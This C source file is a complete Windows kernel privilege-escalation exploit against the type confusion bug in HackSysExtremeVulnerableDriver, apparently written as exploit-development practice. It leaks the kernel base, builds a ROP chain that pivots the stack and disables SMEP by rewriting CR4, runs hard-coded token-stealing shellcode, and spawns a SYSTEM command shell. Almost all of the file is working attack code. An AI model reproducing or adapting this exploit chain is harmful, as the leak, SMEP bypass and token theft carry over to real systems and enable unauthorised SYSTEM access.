
#include <stdio.h>
#include <windows.h>

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(*_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);


typedef struct _USER_TYPE_CONFUSION_OBJECT
{
	ULONG_PTR ObjectID;
	ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;



typedef struct _KERNEL_TYPE_CONFUSION_OBJECT
{
	ULONG_PTR ObjectID;
	union
	{
		ULONG_PTR ObjectType;
		UINT64* Callback;
	};
} KERNEL_TYPE_CONFUSION_OBJECT, * PKERNEL_TYPE_CONFUSION_OBJECT;



char pShellcode[] = {
	0x48, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC9, 0x65,
	0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x80, 0x20, 0x02, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x4D, 0x8B,
	0x89, 0xF0, 0x02, 0x00, 0x00, 0x49, 0x81, 0xE9, 0xF0, 0x02,
	0x00, 0x00, 0x49, 0x8B, 0x89, 0xE8, 0x02, 0x00, 0x00, 0x48,
	0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x05, 0x58, 0x03, 0x00,
	0x00, 0x4D, 0x8B, 0x89, 0x58, 0x03, 0x00, 0x00, 0x4C, 0x89,
	0x08, 0x90, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00,
	0x00, 0x66, 0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0xFF,
	0xC1, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01,
	0x00, 0x00, 0x4C, 0x8B, 0x9A, 0x78, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAA, 0x58,
	0x01, 0x00, 0x00, 0x31, 0xC0, 0x0F, 0x01, 0xF8, 0x48, 0x0F,
	0x07, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};



void SpawnShell() {

	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { 0 };
	Si.cb = sizeof(STARTUPINFOW);

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr, nullptr, &Si, &Pi);
}







UINT64 GetNtBase() {
	NTSTATUS Status = 0x0;
	ULONG ReturnLength = 0;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

	if (NtQuerySystemInformation == nullptr) {
		printf("\n[ERROR GETTING THE ADDRESS TO \"NtQuerySystemInformation\"]\n");
		return 0;
	}

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &ReturnLength);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(nullptr, ReturnLength,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, pModuleInfo, ReturnLength, &ReturnLength);
	if (Status != 0x0) {
		printf("\nError getting the length of the Module Struct -> 0x%0.16X\n", Status);
		return 0;
	}

	printf("\n[Module Name] %s\n\t\\__[Base Address] 0x%p\n\t\\__[Module Size] %d\n",
		pModuleInfo->Modules[0].Name, pModuleInfo->Modules[0].ImageBaseAddress, pModuleInfo->Modules[0].ImageSize);

	char* ModuleName = pModuleInfo->Modules[0].Name;
	PVOID ModuleBase = pModuleInfo->Modules[0].ImageBaseAddress;
	ULONG ModuleSize = pModuleInfo->Modules[0].ImageSize;

	printf("\npModuleInfo->Modules[0] -> 0x%p\n", pModuleInfo->Modules[0]);

	VirtualFree(pModuleInfo, ReturnLength, MEM_RELEASE);

	return (UINT64)ModuleBase;
}






int main() {

	UINT64 KernelBase = GetNtBase();

	if (KernelBase == 0) {
		printf("\n[!] ERROR GETTING THE KERNEL BASE ADDRESS\n");
		getchar();
		return -1;
	}
	printf("\n[KERNEL BASE] -> 0x%p\n", KernelBase);

	HANDLE hHEVD = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),
		0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hHEVD == INVALID_HANDLE_VALUE) {
		printf("\nError getting a handle to the driver\n");
		getchar();
		return -1;
	}
	printf("\nHANDLE created successfully!\n");

	UINT64 StackPivotGadget = KernelBase + 0x522840;
	volatile UINT64 STACK_PIVOT = 0xE8000000;
	UINT64 PopRcx = KernelBase + 0x14f34b;
	UINT64 RcxValue = 0x506F8;
	UINT64 ModCr4 = KernelBase + 0x7274e;

	UINT64 StackAddr = STACK_PIVOT - 0x1000;

	LPVOID KernelStack = VirtualAlloc((LPVOID)StackAddr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (KernelStack == 0) {
		printf("\nERROR ALLOCATING THE BUFFER -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	if (!VirtualLock(KernelStack, 0x10000)) {
		printf("\nERROR LOCKING THE MEMORY RANGE -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	memset(KernelStack, 0x41, 0x1000);

	PVOID pShell = VirtualAlloc(nullptr, 150, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(pShell, pShellcode, 150);

	USER_TYPE_CONFUSION_OBJECT UserStruct = { 0 };
	UserStruct.ObjectID = 0x4141414141414141;
	UserStruct.ObjectType = StackPivotGadget;

	memcpy((UINT64*)STACK_PIVOT, &PopRcx, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 1, &RcxValue, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 2, &ModCr4, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 3, &pShell, sizeof(UINT64));

	printf("\n[STACK_PIVOT] --> 0x%p\n", STACK_PIVOT);
	printf("\n[StackPivotGadget] --> 0x%p", StackPivotGadget);
	printf("\n[MyStack] --> 0x%p", KernelStack);
	printf("\n[PopRcx] --> 0x%p", PopRcx);
	printf("\n[RcxValue] --> 0x%p", RcxValue);
	printf("\n[ModCr4] --> 0x%p", ModCr4);
	printf("\n[pShell] --> 0x%p\n", pShell);

	// wetw0rk helps so much with this :)
	for (unsigned int i = 0; i < 4; i++) {
		Sleep(1000);
	}

	ULONG lpBytesReturned = 0;
	if (!DeviceIoControl(hHEVD, 0x222023, &UserStruct, sizeof(USER_TYPE_CONFUSION_OBJECT), nullptr, 0, &lpBytesReturned, nullptr)) {
		printf("\n[Error triggering Type Confusion]\n");
		// getchar();
		// return -1;
	}

	SpawnShell();

	VirtualFree(pShell, 150, MEM_RELEASE);
	VirtualFree(KernelStack, 0x14000, MEM_RELEASE);

	getchar();

	CloseHandle(hHEVD);
	return 0;
}